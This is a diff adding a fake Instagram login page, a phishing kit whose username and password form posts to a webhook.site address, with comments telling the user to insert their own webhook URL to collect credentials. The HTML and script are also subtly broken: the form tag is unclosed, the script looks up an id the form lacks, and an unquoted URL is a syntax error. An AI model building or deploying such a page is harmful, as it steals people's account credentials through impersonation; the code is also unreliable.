@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram</title>
+    <link rel="stylesheet" href="https://static.ri.me/css/base.css">
+    <style>
+        body { font-family: Arial, sans-serif; background: #fafafa; }
+        .container { width: 350px; margin: 100px auto; border: 1px solid #dbdbdb; padding: 40px; text-align: center; background: white; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 3px; font-weight: bold; cursor: pointer; }
+        button:hover { background: #1877f2; }
+        h2 { margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Instagram</h2>
+        <!-- REPLACE 'YOUR_WEBHOOK_URL_HERE' WITH YOUR WEBHOOK SITE URL -->
+        <form action=https://webhook.site/ece821ac-1113-46fb-991d-b0afeb75d3cd
+            <input type="text" name="username" placeholder="Phone number, username, or email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log in</button>
+        </form>
+        <p style="font-size: 12px; margin-top: 20px;"><a href="https://www.instagram.com/">Forgot password?</a></p>
+    </div>
+
+    <script>
+        const form = document.getElementById('loginForm');
+        form.addEventListener('submit', function(event) {
+            event.preventDefault();
+            // REPLACE 'YOUR_WEBHOOK_URL_HERE' WITH YOUR WEBHOOK SITE URL
+            form.action = https://webhook.site/ece821ac-1113-46fb-991d-b0afeb75d3cd
+            form.submit();
+        });
+    </script>
+</body>
+</html>
